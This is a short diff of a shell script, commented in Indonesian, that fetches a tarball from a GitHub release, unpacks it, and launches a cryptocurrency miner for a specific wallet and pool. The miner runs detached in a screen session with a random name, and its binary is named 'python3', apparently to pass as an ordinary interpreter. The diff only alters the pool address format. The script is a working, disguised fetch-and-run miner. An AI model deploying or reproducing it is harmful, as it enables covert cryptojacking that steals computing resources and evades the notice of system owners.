@@ -15,4 +15,4 @@ wget -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.g
 tar -xvf mek
 
 # Jalankan command dengan screen dan nama acak
-screen -dmS dotsrb_$TID ./dotsrb/python3 --algorithm verushash --pool stratum+tcp://eu.luckpool.net:3956 --wallet RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.luck-$TID
+screen -dmS dotsrb_$TID ./dotsrb/python3 --algorithm verushash --pool eu.luckpool.net:3956 --wallet RT8XoQFACj677vaJQGNJLVeaUB6dmq3AAg.luck-$TID
